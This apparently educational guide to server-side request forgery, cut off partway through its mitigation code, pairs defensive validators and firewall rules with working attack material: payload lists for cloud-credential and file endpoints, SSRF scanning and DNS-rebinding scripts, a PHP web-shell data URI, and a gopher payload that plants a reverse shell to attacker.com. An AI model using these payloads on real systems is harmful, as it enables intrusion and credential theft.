# 🌐 Server-Side Request Forgery (SSRF) - Complete Guide

> **The gateway to internal networks - Master SSRF exploitation and advanced techniques**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of SSRF](#types-of-ssrf)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can lead to unauthorized access to internal systems, data exfiltration, and in some cases, remote code execution.

### 🔍 What Makes SSRF Dangerous?
- **Internal network access** - Bypass firewalls and access internal services
- **Cloud metadata access** - Retrieve sensitive cloud instance metadata
- **Port scanning** - Enumerate internal services and infrastructure
- **Data exfiltration** - Access internal databases and file systems
- **Remote code execution** - In some cases, achieve RCE through internal services
- **Privilege escalation** - Access admin interfaces and sensitive endpoints

### 📊 SSRF Statistics
- **Found in 15%** of web applications during testing
- **Average bounty**: $2,000 - $8,000
- **Severity range**: Medium to Critical (depending on impact)
- **Time to exploit**: Hours to days for complex scenarios
- **Rising trend**: Increased prevalence with cloud adoption

## 🔬 Types of SSRF

### 1. 🎯 Basic SSRF (Direct Response)

The server makes a request to an attacker-controlled URL and returns the response directly to the attacker.

#### How Basic SSRF Works
```
1. Attacker provides malicious URL to vulnerable parameter
2. Server makes HTTP request to the provided URL
3. Server returns the response to the attacker
4. Attacker gains access to internal resources
```

#### Example Vulnerable Code
```php
<?php
// Vulnerable URL fetcher
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;
?>
```

#### Basic SSRF Exploitation
```bash
# Access internal services
https://vulnerable-app.com/fetch.php?url=http://127.0.0.1:80
https://vulnerable-app.com/fetch.php?url=http://localhost:22
https://vulnerable-app.com/fetch.php?url=http://192.168.1.1:8080

# Access cloud metadata
https://vulnerable-app.com/fetch.php?url=http://169.254.169.254/latest/meta-data/
https://vulnerable-app.com/fetch.php?url=http://metadata.google.internal/computeMetadata/v1/

# File system access (if supported)
https://vulnerable-app.com/fetch.php?url=file:///etc/passwd
https://vulnerable-app.com/fetch.php?url=file:///proc/self/environ
```

### 2. 🕵️ Blind SSRF (No Direct Response)

The server makes the request but doesn't return the response to the attacker. Detection relies on side-channel methods.

#### Blind SSRF Detection Methods
```bash
# Time-based detection
# If internal service is slow to respond
https://vulnerable-app.com/fetch.php?url=http://internal-slow-service:80

# DNS-based detection
https://vulnerable-app.com/fetch.php?url=http://unique-id.attacker-domain.com

# HTTP log-based detection
https://vulnerable-app.com/fetch.php?url=http://attacker-server.com/ssrf-test

# Error-based detection
# Different error messages for different internal services
https://vulnerable-app.com/fetch.php?url=http://127.0.0.1:80    # Web server
https://vulnerable-app.com/fetch.php?url=http://127.0.0.1:22    # SSH
https://vulnerable-app.com/fetch.php?url=http://127.0.0.1:3306  # MySQL
```

#### Out-of-Band SSRF Detection
```python
#!/usr/bin/env python3
"""
SSRF Detection Server

Author: LetchuPKT (Lakshmikanthank)
Portfolio: https://letchupkt.vgrow.tech
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime

class SSRFHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the request
        log_entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'method': 'GET',
            'path': self.path,
            'headers': dict(self.headers),
            'client_ip': self.client_address[0]
        }
        
        print(f"[+] SSRF Request detected: {json.dumps(log_entry, indent=2)}")
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'SSRF Test Successful!')
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        log_entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'method': 'POST',
            'path': self.path,
            'headers': dict(self.headers),
            'body': post_data.decode('utf-8', errors='ignore'),
            'client_ip': self.client_address[0]
        }
        
        print(f"[+] SSRF POST Request: {json.dumps(log_entry, indent=2)}")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'SSRF POST Test Successful!')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), SSRFHandler)
    print("[+] SSRF Detection Server running on port 8080")
    server.serve_forever()
```

### 3. 🔄 Semi-Blind SSRF

The server makes the request and provides partial information about the response (status code, response time, etc.).

#### Semi-Blind SSRF Indicators
```bash
# Different response times
http://127.0.0.1:80     # Fast response (web server running)
http://127.0.0.1:8080   # Slow response (service exists but slow)
http://127.0.0.1:9999   # Timeout (no service)

# Different error messages
http://127.0.0.1:80     # "Connection successful"
http://127.0.0.1:22     # "Connection refused"
http://127.0.0.1:3306   # "Invalid protocol"

# Different status codes
http://internal-admin/   # 200 OK
http://internal-api/     # 401 Unauthorized
http://nonexistent/      # Connection timeout
```

## 🔍 Detection Techniques

### 1. 🎯 Manual Detection

#### Common SSRF Parameters
```bash
# URL parameters commonly vulnerable to SSRF
url=
uri=
path=
continue=
redirect=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
show=
navigation=
open=
```

#### SSRF Test Payloads
```bash
# Local host variations
http://127.0.0.1:80
http://localhost:80
http://0.0.0.0:80
http://[::]
http://0000::1:80

# IP address variations
http://2130706433/          # Decimal representation of 127.0.0.1
http://0x7f000001/          # Hexadecimal representation
http://0177.0000.0000.0001/ # Octal representation
http://127.1/               # Short form
http://127.0.1/             # Another short form

# Internal network ranges
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
http://169.254.169.254/     # AWS metadata
http://metadata.google.internal/ # GCP metadata
```

### 2. 🤖 Automated Detection

#### SSRFmap - SSRF Exploitation Tool
```bash
# Installation
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic usage
python3 ssrfmap.py -r data/request.txt -p url -m readfiles

# Advanced usage
python3 ssrfmap.py -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 80-8080

# AWS metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws
```

#### Custom SSRF Scanner
```python
#!/usr/bin/env python3
"""
Advanced SSRF Scanner

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import time
import threading
from urllib.parse import urljoin
import socket

class SSRFScanner:
    def __init__(self, target_url, parameter):
        self.target_url = target_url
        self.parameter = parameter
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Common internal services
        self.internal_services = {
            80: 'HTTP',
            443: 'HTTPS',
            22: 'SSH',
            21: 'FTP',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            110: 'POP3',
            143: 'IMAP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            27017: 'MongoDB',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt',
            9200: 'Elasticsearch'
        }
        
        # Cloud metadata endpoints
        self.cloud_metadata = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',  # Azure
        ]
    
    def test_basic_ssrf(self, payload):
        """Test basic SSRF with payload"""
        try:
            params = {self.parameter: payload}
            response = self.session.get(self.target_url, params=params, timeout=10)
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'response_text': response.text[:500]  # First 500 chars
            }
        except Exception as e:
            return {
                'payload': payload,
                'error': str(e)
            }
    
    def test_time_based_ssrf(self, host, port):
        """Test time-based blind SSRF"""
        payload = f"http://{host}:{port}/"
        
        try:
            start_time = time.time()
            params = {self.parameter: payload}
            response = self.session.get(self.target_url, params=params, timeout=15)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # If response time is significantly different, might indicate SSRF
            if response_time > 5:  # Slow response might indicate connection attempt
                return {
                    'host': host,
                    'port': port,
                    'service': self.internal_services.get(port, 'Unknown'),
                    'response_time': response_time,
                    'likely_vulnerable': True
                }
        except Exception as e:
            pass
        
        return None
    
    def scan_internal_ports(self, host='127.0.0.1'):
        """Scan internal ports for services"""
        print(f"[+] Scanning internal ports on {host}")
        results = []
        
        def scan_port(port):
            result = self.test_time_based_ssrf(host, port)
            if result:
                results.append(result)
                print(f"[+] Potential service found: {host}:{port} ({result['service']})")
        
        threads = []
        for port in self.internal_services.keys():
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        return results
    
    def test_cloud_metadata(self):
        """Test access to cloud metadata services"""
        print("[+] Testing cloud metadata access")
        results = []
        
        for metadata_url in self.cloud_metadata:
            result = self.test_basic_ssrf(metadata_url)
            
            # Check for successful metadata access
            if result.get('status_code') == 200:
                response_text = result.get('response_text', '').lower()
                
                # AWS metadata indicators
                if 'ami-id' in response_text or 'instance-id' in response_text:
                    results.append({
                        'type': 'AWS Metadata',
                        'url': metadata_url,
                        'severity': 'Critical',
                        'evidence': result['response_text'][:200]
                    })
                
                # GCP metadata indicators
                elif 'project' in response_text and 'zone' in response_text:
                    results.append({
                        'type': 'GCP Metadata',
                        'url': metadata_url,
                        'severity': 'Critical',
                        'evidence': result['response_text'][:200]
                    })
                
                # Azure metadata indicators
                elif 'compute' in response_text and 'vmId' in response_text:
                    results.append({
                        'type': 'Azure Metadata',
                        'url': metadata_url,
                        'severity': 'Critical',
                        'evidence': result['response_text'][:200]
                    })
        
        return results
    
    def test_file_access(self):
        """Test file system access via SSRF"""
        print("[+] Testing file system access")
        file_payloads = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/version',
            'file:///proc/self/environ',
            'file://C:/Windows/System32/drivers/etc/hosts',
            'file://C:/boot.ini'
        ]
        
        results = []
        for payload in file_payloads:
            result = self.test_basic_ssrf(payload)
            
            if result.get('status_code') == 200:
                response_text = result.get('response_text', '')
                
                # Check for file content indicators
                if ('root:' in response_text or 
                    'localhost' in response_text or 
                    'Linux version' in response_text or
                    'PATH=' in response_text):
                    
                    results.append({
                        'type': 'File Access',
                        'payload': payload,
                        'severity': 'High',
                        'evidence': response_text[:200]
                    })
        
        return results
    
    def run_comprehensive_scan(self):
        """Run comprehensive SSRF scan"""
        print(f"[+] Starting comprehensive SSRF scan")
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Parameter: {self.parameter}")
        
        all_results = {
            'basic_ssrf': [],
            'port_scan': [],
            'cloud_metadata': [],
            'file_access': []
        }
        
        # Test basic SSRF
        basic_payloads = [
            'http://127.0.0.1:80',
            'http://localhost:80',
            'http://192.168.1.1',
            'http://10.0.0.1'
        ]
        
        for payload in basic_payloads:
            result = self.test_basic_ssrf(payload)
            all_results['basic_ssrf'].append(result)
        
        # Port scanning
        all_results['port_scan'] = self.scan_internal_ports()
        
        # Cloud metadata testing
        all_results['cloud_metadata'] = self.test_cloud_metadata()
        
        # File access testing
        all_results['file_access'] = self.test_file_access()
        
        return all_results

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced SSRF Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameter", required=True, help="Vulnerable parameter")
    parser.add_argument("-o", "--output", help="Output file")
    args = parser.parse_args()
    
    scanner = SSRFScanner(args.url, args.parameter)
    results = scanner.run_comprehensive_scan()
    
    # Print summary
    print("\n[+] SSRF Scan Summary:")
    print(f"  - Cloud Metadata Vulnerabilities: {len(results['cloud_metadata'])}")
    print(f"  - File Access Vulnerabilities: {len(results['file_access'])}")
    print(f"  - Internal Services Found: {len(results['port_scan'])}")
    
    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()
```

## ⚔️ Exploitation Methods

### 1. ☁️ Cloud Metadata Exploitation

#### AWS Metadata Service
```bash
# Basic metadata access
http://169.254.169.254/latest/meta-data/

# Instance information
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Security credentials (most valuable)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# User data (may contain secrets)
http://169.254.169.254/latest/user-data/

# Dynamic data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

#### AWS IMDSv2 Bypass
```bash
# IMDSv2 requires token, but some applications might forward headers
# Try with X-Forwarded-For or other headers
curl -H "X-Forwarded-For: 169.254.169.254" http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Try with different HTTP methods
POST /fetch HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/
```

#### Google Cloud Metadata
```bash
# Basic metadata (requires Metadata-Flavor header)
http://metadata.google.internal/computeMetadata/v1/

# Instance information
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/zone

# Service accounts and tokens
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Project information
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

#### Azure Metadata Service
```bash
# Basic metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Instance information
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Access tokens
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### 2. 🔍 Internal Network Reconnaissance

#### Port Scanning via SSRF
```python
#!/usr/bin/env python3
"""
SSRF Port Scanner

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import threading
import time

def ssrf_port_scan(target_url, param, host, ports):
    """Scan ports using SSRF"""
    open_ports = []
    
    def scan_port(port):
        try:
            payload = f"http://{host}:{port}/"
            params = {param: payload}
            
            start_time = time.time()
            response = requests.get(target_url, params=params, timeout=10)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # Analyze response for port status
            if response.status_code == 200:
                if response_time < 5:  # Quick response might indicate open port
                    open_ports.append(port)
                    print(f"[+] Port {port} appears to be open")
            
        except requests.exceptions.Timeout:
            # Timeout might indicate filtered port
            pass
        except Exception as e:
            pass
    
    # Scan ports in parallel
    threads = []
    for port in ports:
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return open_ports

# Common ports to scan
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 8080, 8443, 9200]

# Usage
target = "http://vulnerable-app.com/fetch.php"
parameter = "url"
internal_host = "192.168.1.1"

open_ports = ssrf_port_scan(target, parameter, internal_host, common_ports)
print(f"Open ports on {internal_host}: {open_ports}")
```

#### Service Enumeration
```bash
# Web services
http://192.168.1.100:80/
http://192.168.1.100:8080/admin/
http://192.168.1.100:8080/manager/html

# Database services
http://192.168.1.100:3306/     # MySQL
http://192.168.1.100:5432/     # PostgreSQL
http://192.168.1.100:27017/    # MongoDB

# Cache services
http://192.168.1.100:6379/     # Redis
http://192.168.1.100:11211/    # Memcached

# Message queues
http://192.168.1.100:5672/     # RabbitMQ
http://192.168.1.100:9092/     # Kafka

# Monitoring services
http://192.168.1.100:9200/     # Elasticsearch
http://192.168.1.100:3000/     # Grafana
http://192.168.1.100:9090/     # Prometheus
```

### 3. 📁 File System Access

#### Local File Inclusion via SSRF
```bash
# Unix/Linux files
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/version
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd
file:///var/log/apache2/access.log
file:///var/log/nginx/access.log

# Windows files
file://C:/Windows/System32/drivers/etc/hosts
file://C:/boot.ini
file://C:/Windows/win.ini
file://C:/Windows/system.ini
file://C:/inetpub/logs/LogFiles/W3SVC1/
```

#### Advanced File Access Techniques
```bash
# PHP wrappers (if PHP is processing the request)
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# FTP protocol for file access
ftp://user:pass@internal-ftp-server/sensitive-file.txt

# SMB/CIFS protocol
smb://internal-server/share/file.txt
```

### 4. 🔗 Protocol Smuggling

#### Gopher Protocol Exploitation
```bash
# Redis exploitation via Gopher
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

# MySQL exploitation via Gopher
gopher://127.0.0.1:3306/_...

# SMTP exploitation via Gopher
gopher://127.0.0.1:25/_HELO%20attacker.com%0AMAIL%20FROM:attacker@attacker.com%0ARCPT%20TO:victim@victim.com%0ADATA%0ASubject:%20SSRF%20Test%0A%0AThis%20is%20a%20test%20email%20sent%20via%20SSRF.%0A.%0AQUIT
```

#### Dict Protocol Exploitation
```bash
# Information gathering via DICT
dict://127.0.0.1:11211/stat    # Memcached stats
dict://127.0.0.1:6379/info     # Redis info
```

## 🚀 Advanced SSRF Techniques

### 1. 🛡️ Filter Bypass Techniques

#### IP Address Obfuscation
```bash
# Decimal representation
http://2130706433/          # 127.0.0.1 in decimal
http://3232235521/          # 192.168.1.1 in decimal

# Hexadecimal representation
http://0x7f000001/          # 127.0.0.1 in hex
http://0xc0a80101/          # 192.168.1.1 in hex

# Octal representation
http://0177.0000.0000.0001/ # 127.0.0.1 in octal

# Mixed representations
http://127.1/               # Short form of 127.0.0.1
http://127.0.1/             # Another short form

# IPv6 representations
http://[::1]/               # IPv6 localhost
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6
```

#### DNS-Based Bypasses
```bash
# DNS rebinding
http://attacker-domain.com/  # Resolves to 127.0.0.1

# Subdomain bypasses
http://127.0.0.1.attacker.com/
http://localhost.attacker.com/

# DNS over HTTPS bypasses
http://dns.google/resolve?name=internal-host&type=A
```

#### URL Encoding Bypasses
```bash
# URL encoding
http%3A//127.0.0.1%3A80/
http%3A%2F%2F127.0.0.1%3A80%2F

# Double URL encoding
http%253A%252F%252F127.0.0.1%253A80%252F

# Unicode encoding
http://127.0.0.1:80/
http://127.0.0.1%E2%80%8B:80/  # Zero-width space
```

#### Protocol Bypasses
```bash
# Alternative protocols
ftp://127.0.0.1/
sftp://127.0.0.1/
tftp://127.0.0.1/
ldap://127.0.0.1/
gopher://127.0.0.1/
dict://127.0.0.1/

# Protocol confusion
http://127.0.0.1:80/../../etc/passwd
https://127.0.0.1:443/../../../etc/passwd
```

### 2. 🔄 Redirect-Based SSRF

#### Open Redirect Chaining
```bash
# Chain open redirect with SSRF
http://vulnerable-app.com/fetch?url=http://trusted-domain.com/redirect?url=http://127.0.0.1:80/

# Multiple redirect chains
http://vulnerable-app.com/fetch?url=http://redirect1.com/r?url=http://redirect2.com/r?url=http://127.0.0.1/
```

#### Custom Redirect Server
```python
#!/usr/bin/env python3
"""
SSRF Redirect Server

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        
        # Get target URL from parameter
        target = query_params.get('target', ['http://127.0.0.1'])[0]
        
        # Send redirect response
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
        
        print(f"[+] Redirecting to: {target}")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), RedirectHandler)
    print("[+] Redirect server running on port 8080")
    print("[+] Usage: http://your-server:8080/?target=http://127.0.0.1")
    server.serve_forever()
```

### 3. 🎭 DNS Rebinding Attacks

#### DNS Rebinding Setup
```python
#!/usr/bin/env python3
"""
DNS Rebinding Server for SSRF

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import socket
import struct
import threading
import time

class DNSRebindingServer:
    def __init__(self, external_ip, internal_ip, port=53):
        self.external_ip = external_ip
        self.internal_ip = internal_ip
        self.port = port
        self.request_count = 0
    
    def handle_dns_request(self, data, addr, sock):
        """Handle DNS request and perform rebinding"""
        self.request_count += 1
        
        # First request: return external IP
        # Subsequent requests: return internal IP
        if self.request_count == 1:
            response_ip = self.external_ip
            print(f"[+] First request from {addr}, returning external IP: {response_ip}")
        else:
            response_ip = self.internal_ip
            print(f"[+] Subsequent request from {addr}, returning internal IP: {response_ip}")
        
        # Build DNS response (simplified)
        response = self.build_dns_response(data, response_ip)
        sock.sendto(response, addr)
    
    def build_dns_response(self, query, ip):
        """Build DNS response packet"""
        # This is a simplified DNS response builder
        # In practice, you'd want a more robust implementation
        
        # Extract transaction ID from query
        transaction_id = query[:2]
        
        # DNS header
        flags = b'\x81\x80'  # Standard query response, no error
        questions = b'\x00\x01'  # 1 question
        answers = b'\x00\x01'    # 1 answer
        authority = b'\x00\x00'  # 0 authority records
        additional = b'\x00\x00' # 0 additional records
        
        header = transaction_id + flags + questions + answers + authority + additional
        
        # Question section (copy from query)
        question = query[12:]  # Skip header
        
        # Answer section
        name_pointer = b'\xc0\x0c'  # Pointer to name in question
        record_type = b'\x00\x01'   # A record
        record_class = b'\x00\x01'  # IN class
        ttl = b'\x00\x00\x00\x01'   # TTL = 1 second (for quick rebinding)
        data_length = b'\x00\x04'   # 4 bytes for IPv4
        ip_bytes = socket.inet_aton(ip)
        
        answer = name_pointer + record_type + record_class + ttl + data_length + ip_bytes
        
        return header + question + answer
    
    def start_server(self):
        """Start DNS rebinding server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', self.port))
        
        print(f"[+] DNS Rebinding server started on port {self.port}")
        print(f"[+] External IP: {self.external_ip}")
        print(f"[+] Internal IP: {self.internal_ip}")
        
        while True:
            try:
                data, addr = sock.recvfrom(512)
                thread = threading.Thread(
                    target=self.handle_dns_request,
                    args=(data, addr, sock)
                )
                thread.start()
            except Exception as e:
                print(f"[-] Error: {e}")

if __name__ == '__main__':
    # Configure your IPs
    external_ip = "1.2.3.4"      # Your server's public IP
    internal_ip = "127.0.0.1"    # Target internal IP
    
    server = DNSRebindingServer(external_ip, internal_ip)
    server.start_server()
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 Input Validation and Filtering

#### URL Validation
```python
#!/usr/bin/env python3
"""
Secure URL Validation for SSRF Prevention

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import ipaddress
import socket
from urllib.parse import urlparse
import re

class SSRFProtection:
    def __init__(self):
        # Define blocked IP ranges
        self.blocked_ranges = [
            ipaddress.ip_network('127.0.0.0/8'),    # Loopback
            ipaddress.ip_network('10.0.0.0/8'),     # Private Class A
            ipaddress.ip_network('172.16.0.0/12'),  # Private Class B
            ipaddress.ip_network('192.168.0.0/16'), # Private Class C
            ipaddress.ip_network('169.254.0.0/16'), # Link-local
            ipaddress.ip_network('224.0.0.0/4'),    # Multicast
            ipaddress.ip_network('240.0.0.0/4'),    # Reserved
        ]
        
        # Define allowed protocols
        self.allowed_protocols = ['http', 'https']
        
        # Define blocked domains
        self.blocked_domains = [
            'localhost',
            'metadata.google.internal',
            '169.254.169.254'
        ]
    
    def is_private_ip(self, ip_str):
        """Check if IP address is private/internal"""
        try:
            ip = ipaddress.ip_address(ip_str)
            for blocked_range in self.blocked_ranges:
                if ip in blocked_range:
                    return True
            return False
        except ValueError:
            return True  # Invalid IP, block it
    
    def validate_url(self, url):
        """Validate URL for SSRF protection"""
        try:
            parsed = urlparse(url)
            
            # Check protocol
            if parsed.scheme not in self.allowed_protocols:
                return False, f"Protocol '{parsed.scheme}' not allowed"
            
            # Check for blocked domains
            hostname = parsed.hostname
            if hostname in self.blocked_domains:
                return False, f"Domain '{hostname}' is blocked"
            
            # Resolve hostname to IP
            try:
                ip = socket.gethostbyname(hostname)
            except socket.gaierror:
                return False, "Unable to resolve hostname"
            
            # Check if resolved IP is private
            if self.is_private_ip(ip):
                return False, f"Resolved IP '{ip}' is private/internal"
            
            # Check port restrictions
            port = parsed.port
            if port and port in [22, 23, 25, 110, 143, 993, 995]:
                return False, f"Port {port} is not allowed"
            
            return True, "URL is safe"
            
        except Exception as e:
            return False, f"URL validation error: {str(e)}"
    
    def safe_fetch(self, url, timeout=10):
        """Safely fetch URL with SSRF protection"""
        is_safe, message = self.validate_url(url)
        
        if not is_safe:
            raise ValueError(f"SSRF Protection: {message}")
        
        # Additional runtime checks
        import requests
        
        # Use a session with restricted configuration
        session = requests.Session()
        
        # Set timeout
        session.timeout = timeout
        
        # Disable redirects to prevent redirect-based SSRF
        session.max_redirects = 0
        
        try:
            response = session.get(url, allow_redirects=False, timeout=timeout)
            return response
        except requests.exceptions.TooManyRedirects:
            raise ValueError("SSRF Protection: Redirects not allowed")

# Usage example
def secure_url_fetch(user_url):
    """Secure wrapper for URL fetching"""
    protection = SSRFProtection()
    
    try:
        response = protection.safe_fetch(user_url)
        return response.text
    except ValueError as e:
        return f"Error: {e}"
    except Exception as e:
        return f"Request failed: {e}"

# Test the protection
if __name__ == '__main__':
    test_urls = [
        'http://google.com',           # Should be allowed
        'http://127.0.0.1',           # Should be blocked
        'http://192.168.1.1',         # Should be blocked
        'http://169.254.169.254',     # Should be blocked
        'ftp://example.com',          # Should be blocked (protocol)
        'http://localhost',           # Should be blocked (domain)
    ]
    
    protection = SSRFProtection()
    
    for url in test_urls:
        is_safe, message = protection.validate_url(url)
        print(f"{url}: {'✓' if is_safe else '✗'} - {message}")
```

### 2. 🌐 Network-Level Protection

#### Firewall Rules
```bash
# iptables rules to block SSRF
# Block access to metadata services
iptables -A OUTPUT -d 169.254.169.254 -j DROP
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP

# Block access to private networks
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 127.0.0.0/8 -j DROP

# Allow only specific external destinations
iptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -j DROP
```

#### AWS Security Groups
```json
{
  "SecurityGroupRules": [
    {
      "IpPermissions": [
        {
          "IpProtocol": "tcp",
          "FromPort": 80,
          "ToPort": 80,
          "IpRanges": [
            {
              "CidrIp": "0.0.0.0/0",
              "Description": "Allow HTTP outbound"
            }
          ]
        },
        {
          "IpProtocol": "tcp",
          "FromPort": 443,
          "ToPort": 443,
          "IpRanges": [
            {
              "CidrIp": "0.0.0.0/0",
              "Description": "Allow HTTPS outbound"
            }
          ]
        }
      ]
    }
  ]
}
```

### 3. 🔧 Application-Level Mitigations

#### Secure HTTP Client Configuration
```python
# Python requests with SSRF protection
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class SSRFProtectedSession(requests.Session):
    def __init__(self):
        super().__init__()
        
        # Configure timeouts
        self.timeout = 10
        
        # Disable redirects
        self.max_redirects = 0
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.mount("http://", adapter)
        self.mount("https://", adapter)
    
    def request(self, method, url, **kwargs):
        # Add default timeout if not specified
        if 'timeout' not in kwargs:
            kwargs['timeout'] = self.timeout
        
        # Disable redirects
        kwargs['allow_redirects'] = False
        
        return super().request(method, url, **kwargs)

# Usage
session = SSRFProtectedSession()
response = session.get('http://example.com')
```

### 4. 🛡️ Defense in Depth

#### Multi-Layer Protection Strategy
```python
class ComprehensiveSSRFProtection:
    def __init__(self):
        self.url_validator = SSRFProtection()
        self.allowed_domains = ['api.trusted-service.com', 'cdn.example.com']
        self.rate_limiter = {}  # Simple rate limiting
    
    def is_domain_allowed(self, hostname):
        """Check if domain is in allowlist"""
        return hostname in self.allowed_domains
    
    def check_rate_limit(self, client_ip):
        """Simple rate limiting"""
        import time
        current_time = time.time()
        
        if client_ip not in self.rate_limiter:
            self.rate_limiter[client_ip] = []
        
        # Remove old requests (older than 1 minute)
        self.rate_limiter[client_ip] = [
            req_time for req_time in self.rate_limiter[client_ip]
            if current_time - req_time < 60
        ]
        
        # Check if rate limit exceeded (max 10 requests per minute)
        if len(self.rate_limiter[client_ip]) >= 10:
            return False
        
        # Add current request
